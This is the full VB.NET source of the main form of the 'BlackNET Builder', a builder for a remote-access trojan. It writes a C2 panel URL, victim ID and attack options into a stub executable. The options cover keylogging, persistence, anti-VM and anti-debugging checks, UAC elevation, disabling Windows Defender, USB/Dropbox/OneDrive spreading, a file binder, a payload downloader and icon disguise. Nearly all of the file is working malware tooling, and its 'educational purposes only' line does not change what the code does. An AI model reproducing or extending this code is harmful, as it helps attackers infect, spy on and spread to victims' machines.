Imports System.Security.Cryptography
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Net
Imports System.Text
Imports BlackNET_Builder.NSListView

' - - - - - - - - - - -
' BlackNET Builder
' v3.7.0.0
' Developed by: Black.Hacker
' Tnx to: NYANxCAT, KFC, 0xfd, LimerBoy, Amadeus.
' - - - - - - - - - - -
Public Class Main
    Dim dialog As New SaveFileDialog
    Dim a As New OpenFileDialog
    Public trd As System.Threading.Thread
    Public st As Integer = 0
    Dim EncryptionKey As New StringBuilder
    Dim f As New OpenFileDialog
    Dim IconName As String
    Dim files() As String = IO.Directory.GetFiles("icons")

    Public Sub AddIcons()
        AddIconsThread()
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim ListOfCombo As New List(Of NSComboBox)
        ListOfCombo.Add(InstallPath)
        ListOfCombo.Add(DroperPath)
        ListOfCombo.Add(DownloadPath)
        ListOfCombo.Add(ClientExt)

        For Each Item As NSComboBox In ListOfCombo
            Item.SelectedItem = Item.Items.Item(0)
        Next

        If Not My.Settings.PanelURL = "" Then
            PanelURL.Text = My.Settings.PanelURL
            VictimID.Text = My.Settings.VictimID
            MUTEX.Text = My.Settings.MUTEX
            DataSplitter.Text = My.Settings.Splitter
            FileName.Text = My.Settings.Filename
            Startup.Checked = My.Settings.Startup
            AntiDebugging.Checked = My.Settings.AntiDebug
            ElevateUAC.Checked = My.Settings.UAC
            USBSpread.Checked = My.Settings.USB
            StealthMode.Checked = My.Settings.Stealth
            Watchdog.Checked = My.Settings.Watchdog
            DropboxSpread.Checked = My.Settings.DropBox
            OnedriveSpread.Checked = My.Settings.OneDrive
            DebugMode.Checked = My.Settings.OneDrive
            SchTask.Checked = My.Settings.Schtask
            BypassVM.Checked = My.Settings.VM
        End If


        Dim tt As New Threading.Thread(AddressOf LoadImages)
        tt.IsBackground = True
        tt.Start()

        If Not IconListView.Items.Count > 0 Then
            Dim t As New Threading.Thread(AddressOf AddIcons)
            t.IsBackground = True
            t.Start()
        End If

        Control.CheckForIllegalCrossThreadCalls = False
    End Sub
    Private Sub LoadImages()
        For Each file As String In files
            If file.EndsWith(".ico") Then
                IconList.Images.Add(Image.FromFile(file))
            End If
        Next
    End Sub
    Private Sub CompileClient_Click(sender As Object, e As EventArgs) Handles CompileClient.Click
        If Not File.Exists((Path.Combine(Application.StartupPath, "stub.exe"))) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        ElseIf (PanelURL.Text = "") Then
            Interaction.MsgBox("Please Enter Your BlackNET Panel URL.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly(Path.Combine(Application.StartupPath, "stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[HOST]") Then
                                            If EnableAES.Checked Then
                                                current.Operand = AES_Encrypt(PanelURL.Text, EncryptionKey.ToString)
                                            Else
                                                current.Operand = PanelURL.Text
                                            End If
                                        Else

                                            If (str = "[ID]") Then
                                                current.Operand = VictimID.Text
                                            End If

                                            If (str = "[StartupName]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Path.Combine(Application.StartupPath, "stub.exe")))
                                            End If

                                            If (str = "[MUTEX]") Then
                                                current.Operand = String.Format("BN[{0}]", MUTEX.Value.ToLower)
                                            End If

                                            If (str = "[Splitter]") Then
                                                current.Operand = DataSplitter.Text
                                            End If

                                            If (str = "[Watcher_Status]") Then
                                                current.Operand = Watchdog.Checked.ToString

                                                If (Watchdog.Checked = True) Then
                                                    Dim info As New FileInfo("watcher.exe")

                                                    Dim res = New EmbeddedResource(info.Name, ManifestResourceAttributes.Private, File.ReadAllBytes(info.FullName))

                                                    definition.MainModule.Resources.Add(res)
                                                End If
                                            End If

                                            If (str = "[Install_Path]") Then
                                                current.Operand = InstallPath.Text
                                            End If

                                            If (str = "[Install_Name]") Then
                                                current.Operand = FileName.Text
                                            End If

                                            If (str = "[Startup]") Then
                                                current.Operand = Startup.Checked.ToString
                                            End If

                                            If (str = "[KeyloggerOnRun]") Then
                                                current.Operand = KeyloggerOnRun.Checked.ToString
                                            End If

                                            If (str = "[BypassSCP]") Then
                                                current.Operand = AntiDebugging.Checked.ToString
                                            End If

                                            If (str = "[AntiVM]") Then
                                                current.Operand = BypassVM.Checked.ToString
                                            End If

                                            If (str = "[HardInstall]") Then
                                                current.Operand = StealthMode.Checked.ToString
                                            End If

                                            If (str = "[USBSpread]") Then
                                                current.Operand = USBSpread.Checked.ToString
                                            End If

                                            If (str = "[AESKey]") Then
                                                current.Operand = EncryptionKey.ToString
                                            End If

                                            If (str = "[EncStatus]") Then
                                                current.Operand = EnableAES.Checked.ToString
                                            End If

                                            If (str = "[Added_SchTask]") Then
                                                current.Operand = SchTask.Checked.ToString
                                            End If

                                            If (str = "[DropboxSpread]") Then
                                                current.Operand = DropboxSpread.Checked.ToString
                                            End If

                                            If (str = "[OneDriveSpread]") Then
                                                current.Operand = OnedriveSpread.Checked.ToString
                                            End If

                                            If (str = "[ElevateUAC]") Then
                                                current.Operand = ElevateUAC.Checked.ToString
                                            End If

                                            If (str = "[DisableWD]") Then
                                                current.Operand = DisableWD.Checked.ToString
                                            End If

                                            If (str = "[CriticalProcess]") Then
                                                current.Operand = CriticalProcess.Checked.ToString
                                            End If

                                            If (str = "[DebugMode]") Then
                                                current.Operand = DebugMode.Checked.ToString
                                            End If

                                            If (str = "[DelayBool]") Then
                                                current.Operand = DelayExecution.Checked.ToString
                                            End If

                                            If (str = "[SleepTime]") Then
                                                current.Operand = ExecutionDelayTime.Text
                                            End If

                                            If (str = "[BinderStatus]") Then
                                                current.Operand = EnableBinder.Checked.ToString

                                                If (EnableBinder.Checked = True) Then
                                                    For Each n As NSListViewItem In FilesPaths.Items
                                                        Dim info As New FileInfo(n.Text)

                                                        Dim res = New EmbeddedResource(info.Name, ManifestResourceAttributes.Private, File.ReadAllBytes(n.Text))

                                                        definition.MainModule.Resources.Add(res)
                                                    Next
                                                End If
                                            End If

                                            If EnableBinder.Checked = True Then
                                                If (str = "[DropperPath]") Then
                                                    current.Operand = DroperPath.SelectedItem.ToString
                                                End If
                                            Else
                                                If (str = "[DropperPath]") Then
                                                    current.Operand = ""
                                                End If
                                            End If

                                            If (str = "[DownloaderStatus]") Then
                                                current.Operand = EnableDownloader.Checked.ToString

                                                If (EnableDownloader.Checked = True) Then
                                                    If (DownloadLinksView.Items.Count > 0) Then
                                                        Dim LinkArray As String = ""
                                                        For Each link As NSListViewItem In DownloadLinksView.Items
                                                            LinkArray &= link.Text & ","
                                                        Next
                                                        Dim res = New EmbeddedResource("Downloader", ManifestResourceAttributes.Private, System.Text.UTF8Encoding.UTF8.GetBytes(ENB(LinkArray)))

                                                        definition.MainModule.Resources.Add(res)
                                                    End If
                                                End If
                                            End If

                                            If EnableDownloader.Checked = True Then
                                                If (str = "[DownloaderPath]") Then
                                                    current.Operand = DownloadPath.SelectedItem.ToString
                                                End If
                                            Else
                                                If (str = "[DownloaderPath]") Then
                                                    current.Operand = ""
                                                End If
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                Dim FileExtention() As String = ClientExt.SelectedItem.ToString.Split(" - ")
                .InitialDirectory = Application.StartupPath
                .FileName = "Client" & FileExtention(0).ToLower
                .Filter = "Executable Applications (*" & FileExtention(0).ToLower & ")|*" & FileExtention(0).ToLower
                .Title = "Choose a place to save your bot | BlackNET v" & ProductVersion
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                If CustomIcon.Checked = True Then
                    If Not IconName = "" Then
                        IconChanger.InjectIcon(dialog.FileName, "icons\" & IconName & ".ico")
                    End If
                End If

                If CustomIconFromFile.Checked = True Then
                    If Not IconPath.Text = "" Then
                        Dim iconinfo As New FileInfo(IconPath.Text)
                        IconChanger.InjectIcon(dialog.FileName, "icons\" & iconinfo.Name)
                    End If
                End If
                MsgBox("Your Client Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
        End If
    End Sub
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Function Randomisi2(ByVal lenght As Integer, ByVal charc As String) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = charc.ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function AES_Encrypt(ByVal plainText As String, ByVal secretKey As String) As String
        Dim encryptedPassword As Byte()
        Using outputStream As MemoryStream = New MemoryStream()
            Dim algorithm As RijndaelManaged = getAlgorithm(secretKey)
            Using cryptoStream As CryptoStream = New CryptoStream(outputStream, algorithm.CreateEncryptor(), CryptoStreamMode.Write)
                Dim inputBuffer() As Byte = Encoding.Unicode.GetBytes(plainText)
                cryptoStream.Write(inputBuffer, 0, inputBuffer.Length)
                cryptoStream.FlushFinalBlock()
                encryptedPassword = outputStream.ToArray()
            End Using
        End Using
        Return Convert.ToBase64String(encryptedPassword)
    End Function
    Private Function getAlgorithm(ByVal secretKey As String) As RijndaelManaged
        Dim salt As String = "vtzh8iRo6puxnQpZHCoMBqGSyyj2zZfw9uejNzwpKH8y284imD35gsmUeAXle1DNOMSAsBcrqINQGbsk"
        Const keySize As Integer = 256

        Dim keyBuilder As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes(salt))
        Dim algorithm As RijndaelManaged = New RijndaelManaged()
        algorithm.KeySize = keySize
        algorithm.IV = keyBuilder.GetBytes(CType(algorithm.BlockSize / 8, Integer))
        algorithm.Key = keyBuilder.GetBytes(CType(algorithm.KeySize / 8, Integer))
        algorithm.Padding = PaddingMode.PKCS7
        Return algorithm
    End Function
    Public Function check_panel(ByVal Panel As String)
        Try
            Dim s As Boolean
            If (IsAccessable(Panel) = True) Then
                s = IsPanel(Panel)
            End If
            Return s
        Catch ex As WebException
            Return False
        End Try
    End Function
    Public Function IsPanel(ByVal PanelURL As String) As Boolean
        Try
            Dim s As Boolean
            If (IsAccessable(PanelURL) = True) Then
                Dim a As String = _GET(PanelURL & "/check_panel.php")
                If (a = Boolean.TrueString Or a = Boolean.FalseString) Then
                    s = Boolean.Parse(a)
                Else
                    s = False
                End If
            End If
            Return s
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Function IsAccessable(ByVal PanelURL As String)
        Dim url As New System.Uri(PanelURL)
        Dim req As System.Net.WebRequest
        ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
        req = System.Net.WebRequest.Create(url)
        Dim resp As System.Net.WebResponse
        Try
            resp = req.GetResponse()
            resp.Close()
            req = Nothing
            Return True
        Catch ex As WebException
            req = Nothing
            Return False
        End Try
    End Function
    Public Function _GET(ByVal Panel As String)
        Try
            Dim responseData As String = ""
            Dim URL As New Uri(Panel)
            Dim s As Net.HttpWebRequest
            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
            s = HttpWebRequest.Create(URL)
            s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
            s.Method = "GET"
            Dim _Response As Net.HttpWebResponse = s.GetResponse()
            Dim responseStream As IO.StreamReader = New IO.StreamReader(_Response.GetResponseStream())
            responseData = responseStream.ReadToEnd()
            _Response.Close()
            Return responseData
        Catch ex As WebException
            Return False
        End Try
    End Function
    Public Function AcceptAllCertifications(ByVal sender As Object, ByVal certification As System.Security.Cryptography.X509Certificates.X509Certificate, ByVal chain As System.Security.Cryptography.X509Certificates.X509Chain, ByVal sslPolicyErrors As System.Net.Security.SslPolicyErrors) As Boolean
        Return True
    End Function

    Private Sub EnableAES_CheckedChanged(sender As Object) Handles EnableAES.CheckedChanged
        If EnableAES.Checked Then
            EncryptionKey.Append(ENB(Randomisi2(50, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@#$%^&*")))
        Else
            EncryptionKey.Clear()
        End If
    End Sub
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        Dim output = Convert.ToBase64String(byt)
        output = output.Split("=")(0)
        output = output.Replace("+", "-")
        output = output.Replace("/", "_")
        ENB = output
    End Function

    Private Sub CheckForUpdate_Click(sender As Object, e As EventArgs) Handles CheckForUpdate.Click
        Try
            Dim DownloadVersion As New WebClient
            Dim DownloadUpdate As New WebClient

            Dim CurrentVersion As String = ProductVersion

            ServicePointManager.ServerCertificateValidationCallback = New System.Net.Security.RemoteCertificateValidationCallback(AddressOf AcceptAllCertifications)
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

            Dim GitHubVersion As String = DownloadVersion.DownloadString("https://raw.githubusercontent.com/FarisCode511/BlackNET/main/version.txt")

            If (Integer.Parse(CurrentVersion.Replace(".", Nothing)) >= Integer.Parse(GitHubVersion.Replace("v", Nothing).Replace(".", Nothing))) Then
                MessageBox.Show("BlackNET is Up to Date.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                If (MessageBox.Show("New update is available," + vbNewLine + "Do you want to download it", "Update check", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = Windows.Forms.DialogResult.Yes) Then

                    DownloadUpdate.DownloadFile("https://github.com/FarisCode511/BlackNET/archive/main.zip", "BlackNET - " & GitHubVersion & ".zip")

                    MessageBox.Show("Update has been downloaded please extract it", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
            End If
        Catch ex As WebException
            MsgBox(ex.Message, MsgBoxStyle.Critical + MsgBoxStyle.OkOnly, "Error")
        End Try
    End Sub

    Private Sub CheckPanel_Click(sender As Object, e As EventArgs) Handles CheckPanel.Click
        If check_panel(PanelURL.Text) Then
            MessageBox.Show("Your Panel is Enabled.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("Your Panel is Disabled or Does not Exist.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub AddLink_Click(sender As Object, e As EventArgs) Handles AddLink.Click
        Dim Link As String = InputBox("Please Enter a Direct Link", "Add a Link")
        If Not (Link = "") Then
            DownloadLinksView.AddItem(Link)
        End If
    End Sub

    Private Sub AddIconFromFile_Click(sender As Object, e As EventArgs) Handles AddIconFromFile.Click
        With a
            .Filter = "icon File (*.ico)|*.ico"
            .Title = "Select Icon"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                IconPath.Text = a.FileName
            End If
        End With
    End Sub

    Private Sub AddFile_Click(sender As Object, e As EventArgs) Handles AddFile.Click
        With f
            .Title = "Please Select a File"
            .Filter = "Files (*.*)|*.*"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                FilesPaths.AddItem(f.FileName)
            End If
        End With
    End Sub

    Private Sub DeleteFile_Click(sender As Object, e As EventArgs) Handles DeleteFile.Click
        If FilesPaths.SelectedItems.Length >= 1 Then
            FilesPaths.RemoveItems(FilesPaths.SelectedItems)
        End If
    End Sub

    Private Sub DeleteLink_Click(sender As Object, e As EventArgs) Handles DeleteLink.Click
        If DownloadLinksView.SelectedItems.Length >= 1 Then
            DownloadLinksView.RemoveItems(DownloadLinksView.SelectedItems)
        End If
    End Sub
    Private Sub PoweredBy_DoubleClick(sender As Object, e As EventArgs) Handles PoweredBy.DoubleClick
        MessageBox.Show("BlackNET v" & ProductVersion & vbNewLine & vbNewLine & "Thx to: NYANxCAT, KFC, 0xfd, LimerBoy and Amadeus" & vbNewLine & vbNewLine & "Copyright (c) Black.Hacker - " & DateTime.UtcNow.Year & vbNewLine & vbNewLine & "This Project is for educational purposes only." & vbNewLine & vbNewLine & "This Project is Licensed under MIT", "About BlackNET", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub CloseSoftware_Click(sender As Object, e As EventArgs) Handles CloseSoftware.Click
        If MessageBox.Show("Do you want to save your current settings?", "Close", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = Windows.Forms.DialogResult.Yes Then
            My.Settings.PanelURL = PanelURL.Text
            My.Settings.VictimID = VictimID.Text
            My.Settings.MUTEX = MUTEX.Text
            My.Settings.Splitter = DataSplitter.Text
            My.Settings.Filename = FileName.Text
            My.Settings.Startup = Startup.Checked
            My.Settings.AntiDebug = AntiDebugging.Checked
            My.Settings.UAC = ElevateUAC.Checked
            My.Settings.USB = USBSpread.Checked
            My.Settings.Stealth = StealthMode.Checked
            My.Settings.Watchdog = Watchdog.Checked
            My.Settings.DropBox = DropboxSpread.Checked
            My.Settings.OneDrive = OnedriveSpread.Checked
            My.Settings.USB = OnedriveSpread.Checked
            My.Settings.USB = DebugMode.Checked
            My.Settings.Schtask = SchTask.Checked
            My.Settings.VM = BypassVM.Checked
            My.Settings.Save()
        Else
            My.Settings.Reset()
        End If
    End Sub

    Private Sub GenerateSleep_Click(sender As Object, e As EventArgs) Handles GenerateSleep.Click
        ExecutionDelayTime.Text = Randomisi2(4, "123456789")
    End Sub

    Private Sub StealthMode_CheckedChanged(sender As Object) Handles StealthMode.CheckedChanged
        Select Case StealthMode.Checked
            Case True
                InstallPath.Enabled = True
                FileName.Enabled = True
            Case False
                InstallPath.Enabled = False
                FileName.Enabled = False
        End Select
    End Sub

    Private Sub IconListView_SelectedIndexChanged(sender As Object, e As EventArgs) Handles IconListView.SelectedIndexChanged
        For Each x As ListViewItem In IconListView.SelectedItems
            IconName = x.Text
        Next
    End Sub

    Private Sub GenerateID_Click(sender As Object, e As EventArgs) Handles GenerateID.Click
        VictimID.Text = Randomisi2(6, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789")
    End Sub
    Private Delegate Sub AddIconsThreadDelegate()
    Private Sub AddIconsThread()
        Try
            BeginInvoke(New AddIconsThreadDelegate(AddressOf AddIconsThreadSub))
        Catch ex As Exception

        End Try
    End Sub
    Private Sub AddIconsThreadSub()
        Try
            Dim i As Integer = 0
            For Each item As String In files
                If item.EndsWith(".ico") Then
                    IconListView.Items.Add(item.Split("\")(1).Split(".")(0), i)
                    i = i + 1
                End If
            Next

        Catch ex As Exception

        End Try
    End Sub

    Private Sub EnableBinder_CheckedChanged(sender As Object) Handles EnableBinder.CheckedChanged
        If EnableBinder.Checked = True Then
            FilesPaths.Enabled = True
            DroperPath.Enabled = True
            AddFile.Enabled = True
            DeleteFile.Enabled = True
        Else
            FilesPaths.Enabled = False
            DroperPath.Enabled = False
            AddFile.Enabled = False
            DeleteFile.Enabled = False
        End If
    End Sub

    Private Sub EnableDownloader_CheckedChanged(sender As Object) Handles EnableDownloader.CheckedChanged
        If EnableDownloader.Checked = True Then
            DownloadLinksView.Enabled = True
            DownloadPath.Enabled = True
            AddLink.Enabled = True
            DeleteLink.Enabled = True
        Else
            DownloadLinksView.Enabled = False
            DownloadPath.Enabled = False
            AddLink.Enabled = False
            DeleteLink.Enabled = False
        End If
    End Sub
End Class
